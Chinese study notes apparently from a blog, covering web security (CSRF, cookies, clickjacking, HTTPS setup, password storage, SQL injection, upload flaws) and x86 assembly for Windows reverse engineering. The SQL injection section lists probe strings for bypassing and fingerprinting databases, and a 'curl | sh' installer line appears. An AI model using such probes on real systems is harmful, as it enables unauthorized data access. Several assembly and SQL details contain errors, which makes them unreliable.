<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 验证码</span></span><br><span class="line"><span class="keyword">var</span> captcha = <span class="title function_">ccap</span>(); <span class="comment">// 调用外部模块生成验证码</span></span><br><span class="line"><span class="keyword">var</span> data = captcha.<span class="title function_">get</span>(); <span class="comment">// 0 - 图片  1 - 文字</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Token</span></span><br><span class="line"><span class="comment">// 后端生成Token，表单或Meta中一份，Cookie中一份。</span></span><br><span class="line"><span class="comment">// 后端收到提交后，判断表单和Cookie中Token是否一致。</span></span><br><span class="line"><span class="comment">// 攻击者没有表单中的Token，也拿不到Cookie中的Token。</span></span><br></pre></td></tr></table></figure>

<p>验证Referer：Referer是HTTP请求头中的部分，可以通过验证该字段是否是A网站来判断请求的合法性。<br>但是有时一些浏览器没有Referer，因此这种验证是否需要要看需求。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 这种验证方法仍然有局限性，可以使用正则表达式</span></span><br><span class="line"><span class="keyword">var</span> referer = ctx.<span class="property">request</span>.<span class="property">headers</span>.<span class="property">referer</span>;</span><br><span class="line"><span class="keyword">if</span>(referer.<span class="title function_">indexOf</span>(<span class="string">&#x27;localhost&#x27;</span>) === -<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Request Error&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><p>特点：</p>
<ul>
<li>存储在前端</li>
<li>后端可以通过设置HTTP头，设置Cookie</li>
<li>请求时，通过HTTP头，交给后端</li>
<li>前端也可以读写</li>
<li>遵守同源策略：协议，域名，端口必须一致。</li>
<li>有有效期</li>
<li>可以用路径(Path)分类</li>
<li>HTTP-ONLY</li>
<li>HTTPS-ONLY (Security)</li>
</ul>
<p>操作：</p>
<ul>
<li>删除：通过设置有效期为过去的时间<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">toGMTString</span>();</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&#x27;name=1; expires=&#x27;</span> + now;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>使用：</p>
<ul>
<li>为了防止被篡改，登录凭证使用：用户ID + 签名</li>
<li>也可以用加密</li>
<li>设置HTTP-ONLY &#x2F; HTTPS-ONLY &#x2F; same-site</li>
<li>SessionID 一般存放到数据库中</li>
</ul>
<p>与网络攻击：</p>
<ul>
<li>XSS可能偷取Cookie</li>
<li>CSRF利用Cookie，但是无法读写Cookie</li>
</ul>
<h2 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h2><p>通过设置一个透明的IFrame，用另外的页面诱骗用户点击一系列位置（目标网站的一系列按钮）。</p>
<p>防御：防止网站被内嵌。</p>
<ul>
<li>使用判断条件：（但是可以被sandbox属性屏蔽）<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">top !== <span class="variable language_">window</span></span><br><span class="line">top.<span class="property">location</span> != <span class="variable language_">window</span>.<span class="property">location</span></span><br></pre></td></tr></table></figure></li>
<li>可以设置头部：X-FRAME-OPTIONS<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ctx.<span class="title function_">set</span>(<span class="string">&#x27;X-Frame-Options&#x27;</span>, <span class="string">&#x27;DENY&#x27;</span>); </span><br><span class="line"><span class="comment">// SAME-ORIGIN / ALLOW-FROM / DENY</span></span><br></pre></td></tr></table></figure></li>
<li>设置验证码</li>
</ul>
<h2 id="HTTP-传输窃听"><a href="#HTTP-传输窃听" class="headerlink" title="HTTP 传输窃听"></a>HTTP 传输窃听</h2><p>使用AnyProxy作为HTTP代理。<br>攻击:</p>
<ul>
<li>中间人通过替换常用脚本，插入攻击代码。 </li>
<li>查看传输的数据</li>
<li>插入广告</li>
<li>重定向网站</li>
<li>无法防御XSS, CRSF</li>
</ul>
<p>防御:</p>
<ul>
<li>使用HTTPS (TLS)</li>
<li>防止中间人攻击, 使用证书机制 CA<ul>
<li>浏览器内置信任列表 </li>
<li>服务器申请证书</li>
<li>CA 颁发证书</li>
<li>浏览器发起请求, 得到证书, 验证通过</li>
</ul>
</li>
<li>证书攻击: 证书无法伪造, 私钥不泄露(存在服务器上), 域名管理权不丢失, CA不出错</li>
<li>Windows 上查看证书 <code>Win+R</code>, <code>mmc</code></li>
</ul>
<p>为网站添加证书:</p>
<ol>
<li>安装脚本<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl https://get.acme.sh |sh</span><br><span class="line"><span class="built_in">cd</span> /root/.acme.sh</span><br><span class="line">./acme.sh  --issue -d mydomain.com -d www.mydomain.com --webroot /home/wwwroot/html/</span><br></pre></td></tr></table></figure></li>
<li>得到证书, 私钥等。<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">/root/.acme.sh/.../name.cer         <span class="comment"># 证书</span></span><br><span class="line">/root/.acme.sh/.../name.key         <span class="comment"># 私钥</span></span><br><span class="line">/root/.acme.sh/.../ca.cer           <span class="comment"># CA 证书</span></span><br><span class="line">/root/.acme.sh/.../fullchain.cer    <span class="comment"># 合并证书</span></span><br></pre></td></tr></table></figure></li>
<li>配置Nginx<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>          <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">listen</span>          <span class="number">443</span> ssl http2;</span><br><span class="line">    <span class="attribute">server_name</span>     www.mydomain.com;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">ssl_certificate</span> /root/.acme.sh/.../fullchain.cer;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /root/.acme.sh/.../name.key;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">root</span> /home/wwwroot/html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>重启Nginx</li>
</ol>
<h2 id="密码安全"><a href="#密码安全" class="headerlink" title="密码安全"></a>密码安全</h2><p>泄露途径：</p>
<ul>
<li>数据库被盗</li>
<li>服务器被入侵</li>
<li>通信链路被窃听</li>
<li>内部人员泄露</li>
<li>撞库（社工）</li>
</ul>
<p>存储：</p>
<ul>
<li>加密存储</li>
<li>单向变化</li>
<li>增强变化复杂度</li>
<li>增强密码复杂度</li>
<li>加盐</li>
</ul>
<h3 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h3><p>明文与密文一一对应。<br>雪崩效应：原文一点点不一样，密文完全不一样。<br>单向变化。<br>密文长度固定。</p>
<p>MD5 SHA1 SHA256：破解方法，彩虹表。最大支持破解8位数字加字母。<br>变换次数越多越安全，彩虹表失效，解密成本增大。</p>
<h3 id="传输过程防范"><a href="#传输过程防范" class="headerlink" title="传输过程防范"></a>传输过程防范</h3><p>使用HTTPS传输。<br>加入密码尝试次数限制。<br>前端加密，但是意义有限，仅防止明文泄露。</p>
<h3 id="生物特征密码"><a href="#生物特征密码" class="headerlink" title="生物特征密码"></a>生物特征密码</h3><p>私密性：容易泄露（照片，接触等）<br>安全性：碰撞<br>唯一性：无法修改</p>
<h2 id="关系型数据库注入"><a href="#关系型数据库注入" class="headerlink" title="关系型数据库注入"></a>关系型数据库注入</h2><p>常见数据库：</p>
<ul>
<li>Access：早期用，单文件</li>
<li>Sqlite：嵌入式设备，单文件，并发弱</li>
<li>Mysql：作为服务，支持大量数据和并发</li>
<li>Mssql Server：作为服务，收费</li>
</ul>
<h3 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h3><p>数据部分被插入了程序。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>常用注入条件：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">0</span>  # 如果报错，则表示注入成功</span><br><span class="line"><span class="keyword">or</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span>   </span><br><span class="line"><span class="keyword">and</span> mid(version(), <span class="number">1</span>, <span class="number">1</span>) <span class="operator">=</span> <span class="number">5</span> # 判断是否是Mysql，以及版本号</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">table</span>;     # 每列都是<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="keyword">select</span> id,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">table</span>;  </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table1 <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> table2; # 猜测表有多少字段</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> mid(username, <span class="number">1</span>, <span class="number">1</span>) <span class="operator">=</span> &quot;t&quot;; # 猜用户名</span><br></pre></td></tr></table></figure>
<p>SQL注入中，如果页面报错，则SQL查询失败。</p>
<p>危害：</p>
<ul>
<li>猜解密码</li>
<li>获取数据</li>
<li>删库删表</li>
<li>拖库</li>
</ul>
<p>防御：</p>
<ul>
<li>关闭错误输出</li>
<li>检查数据类型</li>
<li>对数据进行转义，例如引号，等号等。</li>
<li>使用参数化查询（分解为两次传输）</li>
<li>使用ORM</li>
</ul>
<h2 id="上传问题"><a href="#上传问题" class="headerlink" title="上传问题"></a>上传问题</h2><p>上传文件，再被解析为程序。多发生在PHP中。</p>
<p>防御：</p>
<ul>
<li>过滤非法后缀文件：容易伪造</li>
<li>文件类型(Type)检查：由浏览器提供类型，也可以伪造</li>
<li>文件内容检查：无法拦截混合文件</li>
<li>使用程序输出：通过程序读取文件，再输出给用户。性能受影响</li>
<li>权限控制：可写可执行的目录互斥</li>
<li>使用路由机制</li>
</ul>
<h2 id="泄露信息"><a href="#泄露信息" class="headerlink" title="泄露信息"></a>泄露信息</h2><p>信息内容</p>
<ul>
<li>系统敏感信息</li>
<li>用户敏感信息</li>
<li>用户密码</li>
</ul>
<p>泄露途径</p>
<ul>
<li>错误信息失控</li>
<li>SQL注入</li>
<li>权限控制不当</li>
<li>XSS &#x2F; CSRF</li>
</ul>
<p>OAuth 思想：<br>第三方平台借用QQ等平台的用户凭证。<br>一切用户由用户授权。<br>第三方平台只能拿到Token，其他信息拿不到。</p>
<h1 id="Windows-逆向"><a href="#Windows-逆向" class="headerlink" title="Windows 逆向"></a>Windows 逆向</h1><h2 id="OD-1"><a href="#OD-1" class="headerlink" title="OD"></a>OD</h2><h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><p>打开程序：F3<br>执行单步语句：F8<br>断点：F2</p>
<h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><p>CmdBar</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">db 0x12FFDC  <span class="comment"># d 表示查看数据  b 表示 byte</span></span><br><span class="line"><span class="comment"># 还可以是 dw dd</span></span><br></pre></td></tr></table></figure>

<h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>32位寄存器：<br>EAX 累加器<br>EBX DS段数据指针<br>ECX 计数<br>EDX IO指针<br>ESI 字符串操作源指针 SS段指针<br>ESP 堆栈指针<br>EBP SS段指针<br>EDI 字符串目标指针 ES段指针</p>
<p>16位寄存器：<br>AX, CX, DX, BX, SP, BP, SI, DI<br>0 , 1 , 2 , 3 , 4 , 5 , 6 , 7</p>
<p>8位寄存器：<br>AL, CL, DL, BL, AH, CH, DH, BH<br>0 , 1 , 2 , 3 , 4 , 5 , 6 , 7</p>
<p>如果是64位程序，则所有的寄存器中的E换成R。例如：<br>EAX变为RAX；ESP变为RSP。<br>另外QWORD表示4字64位。</p>
<h3 id="MOV-类"><a href="#MOV-类" class="headerlink" title="MOV 类"></a>MOV 类</h3><p>MOV</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOV</span> 目标操作数, 源操作数</span><br><span class="line"><span class="keyword">MOV</span> 通用寄存器/段寄存器/内存, 通用寄存器/段寄存器/内存/立即数</span><br></pre></td></tr></table></figure>
<p>源操作数和目标操作数不能同时是内存。<br>源操作数和目标操作数必须等宽。</p>
<p>MOVS<br>允许两边同时为内存。但是执行后，结果依据DF位判断增减的方向。DF为1时，减偏移量。一般用于字符串复制。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">MOVS <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[ebi], <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]</span><br></pre></td></tr></table></figure>

<p>MOVSX<br>先符号扩展，再复制变量。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOVSX</span> <span class="built_in">cx</span>, <span class="built_in">al</span></span><br></pre></td></tr></table></figure>

<p>MOVZX<br>先零扩展，再复制变量。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOVZX</span> <span class="built_in">cx</span>, <span class="built_in">al</span></span><br></pre></td></tr></table></figure>

<h3 id="ADD-SUB"><a href="#ADD-SUB" class="headerlink" title="ADD &#x2F; SUB"></a>ADD &#x2F; SUB</h3><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ADD</span> 目标操作数, 源操作数</span><br><span class="line"><span class="keyword">SUB</span> 目标操作数, 源操作数</span><br></pre></td></tr></table></figure>
<p>源操作数和目标操作数不能同时是内存。<br>结果存入目标操作数的位置。</p>
<h3 id="AND-OR-XOR-NOT"><a href="#AND-OR-XOR-NOT" class="headerlink" title="AND &#x2F; OR &#x2F; XOR &#x2F; NOT"></a>AND &#x2F; OR &#x2F; XOR &#x2F; NOT</h3><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">AND</span> 目标操作数, 源操作数</span><br><span class="line"><span class="keyword">OR</span>  目标操作数, 源操作数</span><br><span class="line"><span class="keyword">XOR</span> 目标操作数, 源操作数</span><br><span class="line"><span class="keyword">NOT</span> 目标操作数</span><br></pre></td></tr></table></figure>
<p>源操作数和目标操作数不能同时是内存。<br>结果存入目标操作数的位置。</p>
<h3 id="ADC-SBB"><a href="#ADC-SBB" class="headerlink" title="ADC &#x2F; SBB"></a>ADC &#x2F; SBB</h3><p>通过标志寄存器的进位位计算结果。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">ANC 目标操作数, 源操作数 <span class="comment">; 考虑进位的加法</span></span><br><span class="line"><span class="keyword">SBB</span> 目标操作数, 源操作数 <span class="comment">; 考虑进位的减法</span></span><br></pre></td></tr></table></figure>

<h3 id="CMP-TEST"><a href="#CMP-TEST" class="headerlink" title="CMP &#x2F; TEST"></a>CMP &#x2F; TEST</h3><p>CMP功能和SUB一样，TEST功能和AND一样，但都只修改标志寄存器的值。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CMP</span>  目标操作数, 源操作数 </span><br><span class="line"><span class="keyword">TEST</span> 目标操作数, 源操作数 </span><br></pre></td></tr></table></figure>
<p>CMP判断结果：<br>Z&#x3D;1：相等。<br>S&#x3D;1：目标操作数小于源操作数。<br>TEST判断结果：<br><code>TEST eax, eax</code> Z&#x3D;1：EAX为零。</p>
<h3 id="JCC-类"><a href="#JCC-类" class="headerlink" title="JCC 类"></a>JCC 类</h3><p>JMP：直接修改EIP。不会修改其他寄存器。<br>CALL：会影响堆栈和寄存器。CALL的下一个语句（返回地址）会入栈（ESP）。跳转之后会自动执行，因此需要先加入断点再跳转。<br>RETN：会返回返回地址，会弹栈。相当于POP EIP。如果是<code>RET 8</code>则还会执行<code>ESP+8</code>（内平栈）。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">JE</span> <span class="keyword">JZ</span> 目标操作数       <span class="comment">; ZF=1 相等跳转</span></span><br><span class="line"><span class="keyword">JNE</span> <span class="keyword">JNZ</span> 目标操作数     <span class="comment">; ZF=0 不相等跳转</span></span><br><span class="line"><span class="keyword">JS</span>  目标操作数         <span class="comment">; SF=1 负则跳转</span></span><br><span class="line"><span class="keyword">JNS</span> 目标操作数         <span class="comment">; SF=0 正或0则跳转</span></span><br><span class="line"><span class="keyword">JO</span>  目标操作数         <span class="comment">; OF=1 溢出跳转</span></span><br><span class="line"><span class="keyword">JNO</span> 目标操作数         <span class="comment">; OF=0 不溢出跳转</span></span><br><span class="line"><span class="comment">; 无符号</span></span><br><span class="line"><span class="keyword">JC</span> <span class="keyword">JB</span> <span class="keyword">JNAE</span> 目标操作数  <span class="comment">; CF=1 进位跳转，小于跳转</span></span><br><span class="line"><span class="keyword">JNC</span> <span class="keyword">JNB</span> <span class="keyword">JAE</span> 目标操作数 <span class="comment">; CF=0 无进位跳转，大于等于跳转</span></span><br><span class="line"><span class="keyword">JBE</span> <span class="keyword">JNA</span> 目标操作数     <span class="comment">; ZF=1 或 CF=1 小于等于跳转 </span></span><br><span class="line"><span class="keyword">JNBE</span> <span class="keyword">JA</span> 目标操作数     <span class="comment">; ZF=0 或 CF=0 大于则跳转</span></span><br><span class="line"><span class="comment">; 有符号</span></span><br><span class="line"><span class="keyword">JL</span> <span class="keyword">JNGE</span> 目标操作数     <span class="comment">; SF!=OF 小于则跳转</span></span><br><span class="line"><span class="keyword">JNL</span> <span class="keyword">JGE</span> 目标操作数     <span class="comment">; SF==OF 大于等于则跳转</span></span><br><span class="line"><span class="keyword">JLE</span> <span class="keyword">JNG</span> 目标操作数     <span class="comment">; ZF!=OF 或 ZF=1 小于等于则跳转</span></span><br><span class="line"><span class="keyword">JNLE</span> <span class="keyword">JG</span> 目标操作数     <span class="comment">; SF==OF 且 ZF=0 大于则跳转</span></span><br></pre></td></tr></table></figure>

<h3 id="SET-类"><a href="#SET-类" class="headerlink" title="SET 类"></a>SET 类</h3><p>通过判断条件来设置为1。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SETE</span> <span class="built_in">eax</span>  <span class="comment">; 如果相等，则设置为1</span></span><br></pre></td></tr></table></figure>

<h3 id="XCHG"><a href="#XCHG" class="headerlink" title="XCHG"></a>XCHG</h3><p>交换</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">XCHG</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>]</span><br></pre></td></tr></table></figure>

<h3 id="STOS"><a href="#STOS" class="headerlink" title="STOS"></a>STOS</h3><p>将EAX AX AL的值存放到EDI指定的位置。同样增减方向受到DF标志影响。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">STOS <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>]</span><br></pre></td></tr></table></figure>

<h3 id="REP"><a href="#REP" class="headerlink" title="REP"></a>REP</h3><p>依据ECX指定重复次数。可以与STOS，MOVS一起用。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">REP</span> MOVS <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[ebi], <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]</span><br></pre></td></tr></table></figure>

<h3 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h3><p>算术移位：左移，最低位补0，最高位移入CF。右移，最低位移入CF，最高位不变。<br>有符号数右移。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SAL</span>/<span class="keyword">SAR</span> 目标操作数, 移位次数</span><br></pre></td></tr></table></figure>

<p>逻辑移位：左移，最低位补0，最高位移入CF。右移，最低位移入CF，最改为补0。<br>无符号数右移。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHL</span>/<span class="keyword">SHR</span> 目标操作数, 移位次数</span><br></pre></td></tr></table></figure>

<p>循环移位：溢出位同时进入CF。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ROL</span>/<span class="keyword">ROR</span> 目标操作数, 移位次数</span><br></pre></td></tr></table></figure>

<p>带进位的循环移位：左移，最高位移入CF，CF移入最低为。右移，最低位移入CF，CF移入最高位。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RCL</span>/<span class="keyword">RCR</span> 目标操作数, 移位次数</span><br></pre></td></tr></table></figure>

<h3 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h3><p>BYTE  8 bits<br>WORD  16 bits<br>DWORD 32 bits<br>内存单元宽度 8 bits</p>
<p>以32位计算机为例：</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOV</span> [<span class="number">0x12345678</span>], <span class="number">0xFFFF</span>  <span class="comment">;不推荐</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x12345678</span>], <span class="number">0xFFFF</span></span><br><span class="line"><span class="comment">; MOV 数据宽度 地址（指针） 段寄存器：[地址编号], 0xFFFF</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>每个程序都有一个独立的程序空间。以32位程序为例，程序独有一个4GB的程序空间。但是大多数空间不允许访问。</p>
<p>内存寻址方式：</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="comment">; 立即数</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x123456</span>]  <span class="comment">; 读</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x123456</span>], <span class="built_in">eax</span>  <span class="comment">; 写</span></span><br><span class="line"><span class="keyword">LEA</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x123456</span>]  <span class="comment">; 获取内存地址</span></span><br><span class="line"><span class="keyword">LEA</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esp</span> + <span class="number">8</span>]   <span class="comment">; 获取内存地址</span></span><br><span class="line"><span class="comment">; 寄存器寻址</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>]  <span class="comment">; 读</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span> + <span class="number">1</span>]  <span class="comment">; 读</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span> + <span class="built_in">ecx</span> * <span class="number">2</span>]  <span class="comment">; 读</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">eax</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span> + <span class="built_in">ecx</span> * <span class="number">2</span> + <span class="number">3</span>]  <span class="comment">; 读</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>], <span class="built_in">eax</span>  <span class="comment">; 写</span></span><br></pre></td></tr></table></figure>

<h3 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h3><p>在Windows中，栈由高地址向低地址生长。增加元素时，栈顶指针减小。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="comment">; 创建栈顶栈底</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ebx</span>, <span class="number">0x12FFE0</span>   <span class="comment">; 栈底</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">edx</span>, <span class="number">0x12FFE0</span>   <span class="comment">; 栈顶</span></span><br><span class="line"><span class="comment">; 存放</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span> - <span class="number">4</span>], <span class="number">0xAAAAAAAA</span></span><br><span class="line"><span class="keyword">SUB</span> <span class="built_in">edx</span>, <span class="number">4</span></span><br><span class="line"><span class="comment">;     或</span></span><br><span class="line"><span class="keyword">LEA</span> <span class="built_in">edx</span>, <span class="built_in">dword</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span> - <span class="number">4</span>]</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>], <span class="number">0xBBBBBBBB</span></span><br></pre></td></tr></table></figure>

<p>专用栈：<br>ESP 栈顶<br>EBP 栈底<br>PUSH、POP 只能是16位或32位<br>栈顶指针移动的偏移量，如果是立即数，则偏移4，如果是容器，则偏移容器大小（push ax，偏移2个）</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUSH</span> <span class="number">0x12345678</span>   <span class="comment">; 立即数，寄存器，内存</span></span><br><span class="line"><span class="keyword">POP</span>  <span class="built_in">eax</span>          <span class="comment">; 寄存器，内存</span></span><br><span class="line"><span class="keyword">PUSHAD</span> <span class="comment">; 存入所有寄存器</span></span><br><span class="line"><span class="keyword">POPAD</span>  <span class="comment">; 弹出所有寄存器</span></span><br></pre></td></tr></table></figure>

<h3 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h3><p>0  CF：进位借位标志寄存器<br>2  PF：结果中1的个数是不是偶数<br>4  AF：辅助进位标志（32位时看16位是否进位，16位时看8位是否进位）<br>6  ZF：零标志位，判断结果是否为0<br>7  SF：符号标志，计算结果的最高位<br>8  TF：<br>9  IF：<br>10 DF：方向标志，<br>11 OF：溢出标志位</p>
<h3 id="堆栈图"><a href="#堆栈图" class="headerlink" title="堆栈图"></a>堆栈图</h3><p>栈是由高地址向低地址生长。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="comment">; 传入参数</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="number">1</span>    <span class="comment">; 也可以通过寄存器传入</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="number">2</span></span><br><span class="line"><span class="comment">; 调用</span></span><br><span class="line"><span class="keyword">CALL</span> <span class="number">0x40</span>  <span class="comment">; EIP 会变化，返回地址入栈（ESP）</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">ESP</span>, <span class="number">8</span> <span class="comment">; 去掉调用的参数（在函数外平衡堆栈，外平栈）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 0x40 程序，Debug 版本</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">EBP</span>      <span class="comment">; 旧栈栈底入栈，作为新栈第0号元素</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">EBP</span>, <span class="built_in">ESP</span>  <span class="comment">; 创建新栈，新栈底存存放旧栈栈底地址</span></span><br><span class="line"><span class="keyword">SUB</span> <span class="built_in">ESP</span>, <span class="number">40</span>   <span class="comment">; 生成缓冲区，大小不确定</span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">EBX</span>      <span class="comment">;  </span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">ESI</span>      <span class="comment">; </span></span><br><span class="line"><span class="keyword">PUSH</span> <span class="built_in">EDI</span>      <span class="comment">; 保存寄存器现场</span></span><br><span class="line"><span class="keyword">LEA</span> <span class="built_in">edi</span>, <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span> - <span class="number">40</span>]<span class="comment">; 将第1个缓冲区地址放入EDI</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">ECX</span>, <span class="number">10</span>   <span class="comment">; 设置循环次数</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">EAX</span>, <span class="number">0xCCCCCCCC</span>             <span class="comment">; 赋值，CC是INT3，表示断点，防止缓冲区溢出</span></span><br><span class="line"><span class="keyword">REP</span> STOS <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span> + <span class="number">8</span>] <span class="comment">; 缓冲区全部赋值为EAX</span></span><br><span class="line"><span class="comment">; 